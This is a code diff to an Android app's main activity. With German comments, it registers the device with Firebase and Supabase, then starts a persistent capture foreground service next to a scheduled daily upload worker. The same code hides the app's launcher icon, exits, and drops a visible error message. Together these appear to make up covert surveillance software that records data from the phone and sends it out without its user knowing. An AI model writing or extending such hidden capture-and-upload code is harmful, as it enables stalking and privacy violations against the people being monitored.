@@ -15,6 +15,7 @@ import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.google.firebase.messaging.ktx.messaging
 import com.google.firebase.ktx.Firebase
+import com.ikianti.app.service.CaptureForegroundService
 import com.ikianti.app.worker.DailyUploadWorker
 import java.util.concurrent.TimeUnit
 
@@ -79,8 +80,9 @@ class MainActivity : AppCompatActivity() {
         Firebase.messaging.token.addOnSuccessListener { token ->
             SupabaseApi.upsertDevice(deviceId, token) {
                 Log.d(TAG, "Gerät registriert: $deviceId")
-                // Auf Main-Thread wechseln für UI-Operationen
                 runOnUiThread {
+                    // Persistenten FGS aus dem Vordergrund starten (wichtig für Android 12+)
+                    CaptureForegroundService.start(this)
                     scheduleDailyUpload()
                     hideLauncherIcon()
                     finish()
@@ -88,8 +90,8 @@ class MainActivity : AppCompatActivity() {
             }
         }.addOnFailureListener { e ->
             Log.e(TAG, "FCM-Token Fehler", e)
-            Toast.makeText(this, "Firebase-Verbindung prüfen!", Toast.LENGTH_LONG).show()
             runOnUiThread {
+                CaptureForegroundService.start(this)
                 scheduleDailyUpload()
                 hideLauncherIcon()
                 finish()
